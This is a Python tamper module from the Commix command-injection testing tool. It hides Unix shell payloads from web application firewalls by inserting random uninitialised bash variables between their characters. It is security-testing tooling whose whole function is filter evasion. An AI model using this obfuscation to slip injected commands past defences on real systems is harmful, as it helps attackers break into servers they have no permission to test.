#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import random
import string
from src.utils import settings

"""
About: Adds (randomly generated) uninitialized bash variables, between the characters of each command of the generated payloads.
Notes: This tamper script works against Unix-like target(s).
Reference: https://www.secjuice.com/web-application-firewall-waf-evasion/
"""

__tamper__ = "uninitializedvariable"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  def add_uninitialized_variable(payload):
    settings.TAMPER_SCRIPTS[__tamper__] = True
    num = 2
    obf_char = "${" + ''.join(random.choice(string.ascii_letters) for x in range(num)) + "}"
    payload = re.sub(r'([b-zD-Z])', lambda x: obf_char + x[0], payload)
    for word in settings.IGNORE_TAMPER_TRANSFORMATION:
      _ = obf_char.join(word[i:i+1] for i in range(-1, len(word), 1))
      if _ in payload:
        payload = payload.replace(_,_.replace(obf_char, ""))
    return payload

  if settings.TARGET_OS != settings.OS.WINDOWS:
    if settings.EVAL_BASED_STATE != False:
      return payload
    else:
      return add_uninitialized_variable(payload)
  else:
    return payload

# eof